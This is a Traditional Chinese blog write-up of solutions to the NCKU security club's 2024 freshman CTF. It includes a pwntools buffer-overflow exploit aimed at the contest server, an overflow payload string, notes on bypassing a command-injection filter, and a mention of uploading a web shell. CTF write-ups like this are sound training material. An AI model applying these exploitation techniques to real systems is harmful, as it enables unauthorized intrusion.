---
title: 成大資安社迎新盃CTF 2024 - write-up
published: 2024-10-21
description: '在成大資安社迎新盃 CTF 中所解出來的題目 write-up'
image: 'CTF.png'
tags: [CTF,write-up,Cyber Secutity]
category: 'CTF'
draft: false 
lang: 'zh-tw'
---

## 心得
當賽棍拿摸了個 #7 真開心 XD

![image](https://hackmd.io/_uploads/S1aGoSLIyl.png)

## Pwn
### [新手友善] Overflow Tutorial
第一題問你有一個 8-bit unsigned integer (0 ~ 255)  
現在它是 5 ，請問你要加多少它才會變0  
第二題問你，現在有一個 input buffer 為 0x4040a0    
Target is at 0x4040c0  
Target now has string: pwn2ooo  
要怎麼 overwrite string，很簡單，以下的payload可以幫你
```
12345678901234567890123456789012NCKUCTF
```
### Every pwner's first challenge
經典的入門題，要利用 buffer overflow 來指向到 call_me 的位址
payload:
```py
from pwn import *

r = remote('chall.nckuctf.org', 29102)
call_me_addr = p64(0x401196)

payload = b'A' * 40
payload += call_me_addr

r.recvline()
r.sendline(payload)
r.interactive()
```
## Reverse(破台)
### ✌️✊✋
直接玩就會出 Flag
### Youtube Video Recommendation Tool
開 Ghidra 出來看，把網址一個一個貼上
### Baby Python Assembly
把 python assembly 丟給 AI 叫他翻譯  
然後拿去 decrypt 就可以得到 Flag
### 2048??
打開 DIE(Detect it easy) ，發現是 C#  
打開 dnSpy，發現 Goal = 2486
直接 patch 改成 8 ，然後玩遊戲合成出 8 就直接 Get Flag
### ✌️✊✋ Revenge
DIE 發現有 UPX 殼，先脫殼  
之後發現程式卡住，先 Patch sleep time  
然後發現怎麼出都輸，回去看程式碼，才發現初始化的部分有問題  
把初始化的字串 Patch 掉之後，必輸變成必贏  
直接 Get Flag  
## Web
### Just Image
Source Code 發現它 Path 是利用 base64編碼  
直接把 /flag 拿去編碼，之後 curl 就有 Flag  
~~這題搞了我兩個小時~~
### Looking Glass
看了 source code ，發現只能用 ping 跟 traceroute 才能下 command
之後看到了比較重要的地方
```py
if not re.match('^[+-9A-~]*$', target):
```
意思是 ASCII 從 + ~ 9 ，從A ~ ~ 都不可以用  
之後想了蠻久的一段時間，然後就莫名其妙蹦出來可以用逗號跟大括號的想法    
之後就直接解出Flag
### 好駭客的網站
簡單的 Burp 去竄改封包然後上傳 web shell
## Crypto
### my fiRSt chAllenge
n 是質數就直接暴力算就解開了
### E?
Common Modulus Attack 就可以解出來ㄌ
### [新手友善] BabyRSA (水題兼自己腦抽)
(一堆OOXX)為什麼就沒意識到自己填充方式錯了...
## Misc
### BabyLSB
當初有在讀書會聽檸檬希望分享音頻 CTF 的題材，再加上這題附件的附檔名是wav
應該是音頻解密，就去網路上找 decrypt script
```py
import wave

def extract_data(frames):
    by = 0
    ret = []
    for i, frame in enumerate(frames):
        lsb = frame & 0b00000001
        by += (2**(7 - (i % 8))) * lsb

        if i % 8 == 7:
            ret.append(by.to_bytes(1, "little"))
            by = 0

    return b"".join(ret)



if __name__ == '__main__':
    filename = "Yee_is_good.wav"
    wf = wave.open(filename, "rb")
    print(wf.getparams())

    frames = wf.readframes(wf.getnframes())
    flag = extract_data(list(frames)[:1000])
    wf.close()

    print(flag)
```